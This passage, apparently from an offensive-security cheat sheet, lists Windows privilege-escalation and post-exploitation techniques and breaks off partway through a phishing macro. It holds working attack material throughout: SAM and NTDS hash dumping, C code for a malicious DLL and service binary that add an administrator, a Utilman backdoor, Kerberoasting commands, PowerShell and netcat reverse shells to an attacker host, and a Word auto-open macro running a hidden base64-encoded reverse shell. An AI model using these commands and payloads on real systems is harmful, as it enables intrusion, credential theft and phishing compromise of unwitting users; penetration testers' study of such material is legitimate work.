Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

###### Internet Information Service (IIS)

```c
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

###### PuTTY

```c
reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
```

###### Unattended Windows Installations

```c
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

##### Enable WinRM

```c
winrm quickconfig
```

##### Enable Remote Desktop (RDP)

```c
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

or

```c
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```

##### Privileges and Permissions

###### AlwaysInstallElevated

```c
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```

```c
msiexec /quiet /qn /i <FILE>.msi
```

###### SeBackup and SeRestore Privilege

###### Backup SAM and SYSTEM Hashes

```c
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

###### Dumping Hashes

```c
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```c
pypykatz registry --sam sam.hive system.hive
```

###### SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

###### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
diskshadow /s <FILE>.txt
```

###### Copy ntds.dit

```c
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

###### Export System Registry Value

```c
reg save HKLM\SYSTEM c:\temp\system
```

###### Extract the Hashes

```c
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

###### Alternative Way via Robocopy

```c
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

```c
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
 
```c
diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

```c
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

###### SeLoadDriverPrivilege

```c
sc.exe query
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```

```c
sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe stop VSS
sc.exe start VSS
```

###### SeTakeOwnershipPrivilege

```c
takeown /f C:\Windows\System32\Utilman.exe
```

```c
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```c
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

###### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```c
.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

##### DLL Hijacking

###### Standard Search Order

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\PATH\TO\BINARY\<BINARY>.exe
Restart-Service <SERVICE>
$env:path
```

###### DLL Abuse

###### customdll.cpp

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

###### Compiling customdll.cpp

```c
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
```

Copy the `.dll` file to the desired path.

```c
Restart-Service <SERVICE>
Get-LocalGroupMember administrators
```

##### Leveraging Windows Services

###### Running Services Enumeration

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

###### Service Configuration Enumeration

```c
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

###### Permission Table

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

###### Permission Enumeration

```c
icacls "C:\PATH\TO\BINARY\<BINARY>"
```

###### Permissions Abuse

###### adduser.c

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <USERNAME> <PASSWORD> /add");
  i = system ("net localgroup administrators <USERNAME> /add");
  
  return 0;
}
```

###### Compiling

```c
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

###### Execution

```c
net stop <SERVICE>
net start <SERVICE>
```

or 

```c
shutdown /r /t 0
Get-LocalGroupMember administrators
```

###### PowerView Example

```c
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

###### Service Execution Properties Enumeration

```c
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
$ModifiableFiles
```

##### Unquoted Service Paths

###### Search Order

```c
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

###### Service Path Enumeration

Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.

```c
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Start-Service <SERVICE>
Stop-Service <SERVICE>
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

###### PowerView Example

```c
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
Start-Service <SERVICE>
Get-LocalGroupMember administrators
```

##### Scheduled Tasks Enumeration

Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.

```c
schtasks /query /fo LIST /v
icacls C:\PATH\TO\BINARY\<BINARY>.exe
Get-LocalGroupMember administrators
```

##### writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

```c
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

#### PassTheCert

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```c
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

#### PKINITtools

```c
python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
export KRB5CCNAME=<USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
```

#### Port Scanning

```c
for i in $(seq 1 254); do nc -zv -w 1 <XXX.XXX.XXX>.$i <RPORT>; done
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### powercat

```c
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

#### Powermad

```c
Import-Module ./Powermad.ps1
$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
New-MachineAccount -MachineAccount <NAME> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

#### PowerShell

##### Common Commands

```c
whoami /all
getuserid
systeminfo
Get-Process
net users
net users <USERNAME>
Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=<DOMAIN>"
Get-Content <FILE>
Get-ChildItem . -Force
GCI -hidden
type <FILE> | findstr /l <STRING>
[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

##### Allow Script Execution

```c
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```

##### Script Execution Bypass

```c
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

##### Import Module to PowerShell cmdlet

```c
Import-Module .\<FILE>
```

##### Check PowerShell Versions

```c
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

##### Read PowerShell History

```c
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

##### Base64 Encoding using pwsh

```c
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

##### Create a .zip File

```c
Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

##### Unzip a File

```c
Expand-Archive -Force <FILE>.zip
```

##### Start a new Process

```c
Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

##### Invoke-Expression / Invoke-WebRequest

```c
IEX(IWR http://<LHOST>/<FILE>.ps1)
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

##### .NET Reflection

```c
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

##### Switching Sessions in PowerShell

```c
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred
```

or

```c
$SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami }
```

or

```c
$username = '<USERNAME>'
$password = '<PASSWORD>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```

```c
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

##### Add new Domain Administrator

```c
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

##### Execute Commands in User Context

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

##### Execute Scripts with Credentials (Reverse Shell)

```c
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### PrivescCheck

```c
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
```

```c
Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

#### pwncat

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

#### rpcclient

```c
rpcclient -U "" <RHOST>
```

```c
dsr_getdcname
dsr_getdcnameex
dsr_getdcnameex2
dsr_getsitename
enumdata
enumdomgroups
enumdomusers
enumjobs
enumports
enumprivs
getanydcname
getdcname
lookupsids
lsaenumsid <SID>
lsaquery
netconnenum
netdiskenum
netfileenum
netsessenum
netshareenum
netshareenumall
netsharegetinfo
queryuser <USERNAME>
srvinfo
```

#### Rubeus

##### Common Commands

```c
.\Rubeus.exe dump /nowrap
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /outfile:hashes.asreproast
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

##### Request a Delegation Ticket

```c
.\Rubeus.exe tgtdeleg /nowrap
```

##### Overpass the Hash

```c
.\Rubeus.exe kerberoast /user:<USERNAME>
```

##### Pass the Hash

```c
.\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

#### RunasCs

```c
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
```

#### Seatbelt

```c
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all -full
```

#### smbpasswd

```c
smbpasswd -r <RHOST> -U <USERNAME>
```

#### winexe

```c
winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
```

### Social Engineering Tools

#### Microsoft Office Word Phishing Macro

##### Payload

```c
IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1"); powercat -c <LHOST> -p <LPORT> -e powershell
```

or

```c
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

or

```c
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

##### Encoding

> https://www.base64decode.org/

Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.

```c
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

###### Alternatively using pwsh

```c
$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
```

##### Python Script for Formatting

```c
str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```c
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="
```

##### Final Macro

```c
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
    Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"
    Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADE"
    Str = Str + "ANwAxACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAP"
    Str = Str + "QAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQA"
    Str = Str + "oACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9A"
    Str = Str + "CAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGw"
    Str = Str + "AZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAY"
    Str = Str + "QBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQB"
    Str = Str + "zAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7A"
    Str = Str + "CQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ"
    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
